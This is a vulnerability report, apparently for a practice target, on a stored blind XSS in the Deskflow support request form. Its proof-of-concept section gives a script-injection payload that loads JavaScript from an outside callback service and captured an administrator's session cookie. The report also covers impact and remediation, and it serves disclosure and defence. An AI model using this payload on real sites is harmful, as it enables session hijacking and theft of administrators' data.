## Title
Blind XSS - Deskflow Support Request

## Description
A Blind Cross-Site Scripting (XSS) vulnerability was identified in the Deskflow support request form. User-controlled input submitted through the Name, Subject, and Description fields is stored and later rendered in the administrator's ticket view without adequate sanitization or output encoding.

A crafted payload submitted by a customer executes JavaScript when an administrator opens the submitted support request. This allows attacker-controlled JavaScript to execute in the administrator's browser context.

**Affected URL:** https://deskflow.pwnedbox.site/request.php  
**Trigger URL:** https://deskflow.pwnedbox.site/admin/view.php?id=2

## Steps to Reproduce
1. Open the Deskflow support request page.
2. Enter the XSS payload in the Name, Subject, and Description fields.
3. Submit the support request.
4. Wait for an administrator to open the submitted ticket.
5. Verify the execution through the XSS.report dashboard.

## POC (Proof of Concept)
**Affected Application:** Deskflow  
**Submission URL:** https://deskflow.pwnedbox.site/request.php  
**HTTP Method:** POST  
**Affected Input Fields:** Name, Subject, Description

**Payload:**
```html
"><Script src=https://xss.report/c/mihir></Script>
```

**Observed Result:**

The submitted payload was stored in the support request. When the administrator accessed the ticket at:

```text
https://deskflow.pwnedbox.site/admin/view.php?id=2
```

the external JavaScript payload was triggered and generated callbacks on the XSS.report dashboard.

The callback evidence showed:
- The vulnerable page URL was the administrator's ticket-view page.
- The referrer was the administrator dashboard.
- The origin was `https://deskflow.pwnedbox.site`.
- The callback recorded the PHP session cookie. The cookie value is intentionally redacted in this report.
- The XSS.report dashboard showed cookie capture as successful.

**Screenshot Evidence:**
1. Support request form containing the submitted payload.
<img width="1918" height="982" alt="image" src="https://github.com/user-attachments/assets/04a089ee-50b1-4e02-82d2-ea3f95335bc1" />

2. Administrator ticket view displaying the submitted content.
<img width="1919" height="963" alt="image" src="https://github.com/user-attachments/assets/fa2636fd-5f27-45b5-8bf3-cc3154660657" />

3. XSS.report dashboard showing callbacks associated with the Deskflow administrator page.
<img width="1919" height="974" alt="image" src="https://github.com/user-attachments/assets/4dbb99fe-30cf-489b-b949-4ea3944bfa91" />

4. XSS.report detail report showing the triggered page URL, referrer, origin, and cookie capture.
<img width="1919" height="970" alt="image" src="https://github.com/user-attachments/assets/b8942654-da1f-4f26-bb04-761b5e79aae2" />


## Impact
An attacker can submit a malicious support request that executes JavaScript when viewed by an administrator.

Potential consequences include:
- Execution of attacker-controlled JavaScript in the administrator's browser context.
- Exposure of sensitive information accessible to the administrator's browser.
- Potential session compromise if a captured session cookie is valid and usable.
- Abuse of the administrator's authenticated session, depending on cookie protections and application security controls.

## Remediation
1. Apply context-aware output encoding to all user-controlled ticket fields before rendering them in the administrator interface.
2. Sanitize untrusted input using a well-maintained HTML sanitization library if HTML input is required.
3. Avoid inserting untrusted input directly into HTML using unsafe rendering methods.
4. Implement a restrictive Content Security Policy (CSP) to reduce the impact of script injection.
5. Configure session cookies with `HttpOnly`, `Secure`, and appropriate `SameSite` attributes.
